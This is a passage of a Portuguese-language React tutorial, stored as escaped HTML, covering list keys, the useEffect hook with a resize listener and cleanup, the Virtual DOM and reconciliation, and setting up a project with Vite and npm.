&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt; &lt;span class="na"&gt;key&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;tech&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;tech&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A propriedade &lt;code&gt;key&lt;/code&gt; ajuda o React a identificar os elementos de uma lista entre renderizações.&lt;/p&gt;

&lt;p&gt;Prefira identificadores estáveis e únicos entre os elementos irmãos, principalmente quando a lista pode sofrer alterações.&lt;/p&gt;

&lt;h2&gt;


08. useEffect — Sincronização com sistemas externos
&lt;/h2&gt;

&lt;p&gt;O Hook &lt;code&gt;useEffect&lt;/code&gt; é utilizado para sincronizar um componente com sistemas externos, como eventos do navegador, conexões e APIs externas.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useEffect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;WindowWidth&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setWidth&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerWidth&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nf"&gt;useEffect&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;handleResize&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;setWidth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerWidth&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;resize&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;handleResize&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;removeEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;resize&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nx"&gt;handleResize&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;[]);&lt;/span&gt;

&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Width: &lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;width&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;px&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nesse exemplo, &lt;code&gt;useEffect&lt;/code&gt; registra um listener para acompanhar o redimensionamento da janela.&lt;/p&gt;

&lt;p&gt;A função retornada realiza a limpeza do listener quando necessário.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Observação:&lt;/strong&gt; nem toda transformação de dados exige &lt;code&gt;useEffect&lt;/code&gt;. Cálculos que dependem apenas de props e estados geralmente podem ser realizados diretamente durante a renderização.&lt;/p&gt;

&lt;h2&gt;


09. Virtual DOM e Renderização
&lt;/h2&gt;

&lt;p&gt;O React utiliza uma representação dos elementos da interface em memória, frequentemente associada ao conceito de &lt;strong&gt;Virtual DOM&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Quando ocorre uma atualização:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;O React renderiza novamente os componentes necessários.&lt;/li&gt;
&lt;li&gt;Compara a nova estrutura de elementos com a anterior durante a reconciliação.&lt;/li&gt;
&lt;li&gt;Determina quais mudanças precisam ser aplicadas.&lt;/li&gt;
&lt;li&gt;Realiza as atualizações necessárias no ambiente de renderização.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Esse processo ajuda a organizar as atualizações da interface sem exigir manipulação manual do DOM para cada alteração.&lt;/p&gt;

&lt;p&gt;Entretanto, o Virtual DOM não significa que toda aplicação React será automaticamente mais rápida que uma implementação em JavaScript puro.&lt;/p&gt;

&lt;h2&gt;


10. Criando um projeto com Vite
&lt;/h2&gt;

&lt;p&gt;O Vite é uma ferramenta que permite criar e executar projetos React com uma configuração inicial simples.&lt;/p&gt;

&lt;p&gt;Para criar um projeto:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm create vite@latest react-study &lt;span class="nt"&gt;--&lt;/span&gt; &lt;span class="nt"&gt;--template&lt;/span&gt; react
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Entre no diretório:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;react-study
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Instale as dependências:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Inicie o servidor de desenvolvimento:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm run dev
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A aplicação estará acessível pelo endereço informado no terminal.&lt;/p&gt;

&lt;p&gt;Para executar esse processo, é necessário ter uma versão do Node.js compatível com os requisitos do Vite instalado.&lt;/p&gt;

&lt;h2&gt;


